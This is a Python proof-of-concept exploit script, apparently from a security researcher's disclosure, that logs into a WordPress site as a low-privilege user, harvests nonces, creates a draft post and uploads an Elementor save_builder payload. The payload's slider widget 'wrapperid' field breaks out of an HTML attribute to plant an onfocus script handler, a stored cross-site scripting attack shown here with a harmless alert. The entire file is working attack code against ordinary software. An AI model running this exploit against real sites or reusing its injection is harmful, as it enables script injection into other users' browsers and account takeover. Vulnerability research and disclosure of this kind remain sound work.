import re
import sys
from os.path import basename

import requests

"""
Author: Mat Rollings (stealthcopter)
Website: sec.stealthcopter.com

Updated PoC script no longer needs an Elementor POST ID :D
"""

USER = 'user'
PASSWORD = 'user'
PAYLOAD_ID = 1
TARGET = 'http://wordpress.local:1337'

payloads = {
    1: '{"save_builder":{"action":"save_builder","data":{"status":"draft","elements":[{"id":"774a1b9","elType":"container","isInner":false,"isLocked":false,"settings":{},"elements":[{"id":"fff2407","elType":"widget","isInner":false,"isLocked":false,"settings":{"wrapperid":"123xxxx\\"tabindex=\\"1\\"autofocus=\\"\\"onfocus=\\"alert(`payload1`)\\"x=\\""},"elements":[],"widgetType":"slider_revolution"}]}],"settings":{"post_title":"Test+Slider","post_status":"draft"}}}}',
}

PAYLOAD = payloads[PAYLOAD_ID]

if not PAYLOAD:
    print('Invalid payload')
    sys.exit()

session = requests.session()

# Proxy can be uncommented here for debugging:
# session.proxies = {'http': 'http://localhost:8080'}

def do_login(username, password):
    session.get(f'{TARGET}/wp-login.php')
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'testcookie': 1
    }
    r = session.post(f'{TARGET}/wp-login.php', data=data, allow_redirects=False)

    if r.status_code == 302:
        print(f"[+] Login Successful")
        return True

    print(r.text)
    print(f"[-] Login Failed")


def get_next_post_id_and_api_nonce():
    r = session.get(f'{TARGET}/wp-admin/post-new.php')
    new_post_pattern = r'"rendered":\s*"http[^"]*\?p=([0-9]+)"'
    api_nonce_pattern = r'createNonceMiddleware\(\s*"([a-zA-Z0-9]+)"\s*\)'
    post = re.search(new_post_pattern, r.text)
    api_nonce = re.search(api_nonce_pattern, r.text)
    post_id = post.group(1)
    nonce = api_nonce.group(1)
    return post_id, nonce


def create_new_post(id, api_nonce):
    data = {
        'title': f'{basename(__file__)}',
        'content': '',
        'status': 'draft'
    }
    headers = {'X-WP-Nonce': api_nonce}
    r = session.post(f'{TARGET}/wp-json/wp/v2/posts/{id}', headers=headers, json=data)
    print(r.text)
    if r.ok:
        return r.json()['id']


def get_nonce():
    r = session.get(f'{TARGET}/wp-admin/')
    nonce_pattern = r'"ajax"\s*:\s*\{\s*\n*\s*"url":\s*"[^"]*admin-ajax.php",\s*\n*\s*"nonce":\s*"([a-zA-Z0-9]+)"'
    nonce = re.search(nonce_pattern, r.text)
    return nonce.group(1)


def upload_xss(nonce, post_id):
    data = {
        'action': 'elementor_ajax',
        'editor_post_id': post_id,
        'initial_document_id': post_id,
        '_nonce': nonce,
        'actions': PAYLOAD,
    }

    r = session.post(f'{TARGET}/wp-admin/admin-ajax.php', data=data)

    if not r.ok or not r.json()['success']:
        print(r.text)
        print(f"[!] Posting failed")
        return False
    print(r.json())
    return True


def exploit():
    if not do_login(USER, PASSWORD):
        return False

    nonce = get_nonce()
    if not nonce:
        print(f"[!] Error: Could not get nonce!")
        return False

    print(f"[+] Nonce: {nonce}")

    post_id, api_nonce = get_next_post_id_and_api_nonce()
    print(f"[+] Next Post ID: {post_id}")
    print(f"[+] API Nonce: {api_nonce}")

    if not post_id:
        print(f"[!] Error: Could not get next post id!")
        return False

    if not api_nonce:
        print(f"[!] Error: Could not get API nonce id!")
        return False

    post_id = create_new_post(post_id, api_nonce)

    if not post_id:
        print(f"[!] Error: Could not create new post with id: {post_id}!")
        return False

    print(f"[+] Post ID: {post_id}")
    print(f"[+] Payload: {PAYLOAD_ID}")

    # This little request lets Elementor steal the post, otherwise you'll get access denied
    try:
        session.get(f'{TARGET}/wp-admin/post.php?post={post_id}&action=elementor')
    except:
        # Catch some weird chunking error proxy is throwing...
        pass

    if upload_xss(nonce, post_id):
        print(f"[+] Updated Post: {post_id}")
        print(f"[+] Visit: {TARGET}/?p={post_id}")
    else:
        print('[!] Error could not update post')


exploit()
